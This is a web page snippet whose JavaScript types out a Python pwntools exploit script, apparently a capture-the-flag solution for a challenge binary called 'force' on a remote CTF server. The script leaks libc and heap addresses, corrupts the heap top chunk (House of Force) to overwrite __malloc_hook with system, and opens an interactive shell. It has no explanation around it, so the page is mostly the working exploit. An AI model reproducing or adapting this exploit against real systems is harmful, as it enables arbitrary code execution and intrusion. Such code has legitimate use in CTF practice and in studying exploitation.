 <span id="activity-content"></span> <br>

<script type="text/javascript">
    async function typewriter(text, elementId, waitAfter) {
        var n = 0,
            isTag = false
        addText = "";
        const el = document.getElementById(elementId);

        const wait = () => new Promise(r => setTimeout(r, waitAfter));
        const nowait = () => new Promise(r => r());

        const render = () => el.innerHTML = (text.slice(0, n + 1) + addText);

        const cursor = document.createElement('span');
        cursor.id = "blink";

        el.style.setProperty("--cursor-visibility", "visible");
        while (n < text.length) {
            if (text.charAt(n + 1) === "<") isTag = true;
            if (text.charAt(n + 1) === ">") isTag = false;

            if (isTag) {
                n++;
                continue;
            }

            requestAnimationFrame(render);

            if (waitAfter === 0) {
                await nowait();
            } else {
                await wait();
            }

            n++;
        }
        el.style.setProperty("--cursor-visibility", "collapse");
    }

    function parseDelay(d) {
        const parsed = parseInt(d, 10);
        if (isNaN(parsed)) return 0;
        return parsed;
    }

    const titleDelay = parseDelay("0"),
        contentDelay = parseDelay("0");
    const typeeffetct = async () => {
        await typewriter("\u003cspan id=\u0027terminal\u0027\u003e\u003ch1 id=\u0027title\u0027\u003e\u003c\/h1\u003e\u003c\/span\u003e", "activity-title", titleDelay);
        await typewriter("\u003cspan id=\u0027terminal\u0027\u003e\u003cpre\u003e\u003ccode\u003e#!\/usr\/bin\/env python3\nfrom pwn import *\n\nelf = context.binary = ELF(\u0027.\/force\u0027)\nlibc = ELF(\u0027.\/.glibc\/glibc_2.28_no-tcache\/libc-2.28.so\u0027)\n# io = gdb.debug([elf.path])\nio = remote(\u00270.cloud.chals.io\u0027, 11996)\n\nio.readline()\nsystem = int(io.readline().strip().split(b\u0027 \u0027)[-1], 16)\nlog.success(f\u0027Leaked system: {hex(system)}\u0027)\nlibc.address = system - libc.symbols.system\nlog.success(f\u0027Libc base: {hex(system)}\u0027)\nheap = int(io.readline().strip().split(b\u0027 \u0027)[-1], 16)\nlog.success(f\u0027Leaked heap: {hex(heap)}\u0027)\n\ndef get_chunk(size, data):\n    io.sendline(b\u00271\u0027)\n    io.sendline(str(size).encode())\n    io.sendline(data)\n\nget_chunk(0x10, b\u0027A\u0027*0x18\u002bpack(-1))\ntop_chunk_addr = heap \u002b 0x20\n\nrequest_size = libc.symbols.__malloc_hook - top_chunk_addr - 2 * 8 - 8\nget_chunk(request_size, \u0027\u0027)\nget_chunk(0x10, pack(system))\nget_chunk(next(libc.search(b\u0027\/bin\/sh\\x00\u0027)), \u0027\u0027)\n\nio.interactive()\n\u003c\/code\u003e\u003c\/pre\u003e\u003c\/span\u003e", "activity-content", contentDelay);
        return;
    }

    typeeffetct()
</script>
